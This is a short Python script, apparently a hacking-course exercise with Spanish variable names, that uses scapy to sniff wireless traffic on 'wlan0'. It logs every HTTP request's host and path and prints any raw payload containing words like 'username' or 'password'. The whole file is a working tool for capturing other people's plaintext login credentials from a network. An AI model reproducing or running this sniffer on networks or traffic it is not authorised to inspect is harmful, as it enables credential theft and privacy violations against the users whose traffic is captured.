#!/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http

def sniff (interference):

    scapy.sniff(iface=interference, store=False,prn=process_sniff,)
def process_sniff(paquete):

    if paquete.haslayer(http.HTTPRequest):
        url = paquete[http.HTTPRequest].Host + paquete[http.HTTPRequest].Path
        print(url)
        print("[+]HTTPRequest "+str(url))

        if paquete.haslayer(scapy.Raw):
            carga = str(paquete[scapy.Raw].load)
            posibilidades = ["username","user","name","pass","password"]

            for palabra in posibilidades:
               if palabra in carga:
                    print("usario y contraseña"+str(carga))
                    break




sniff("wlan0")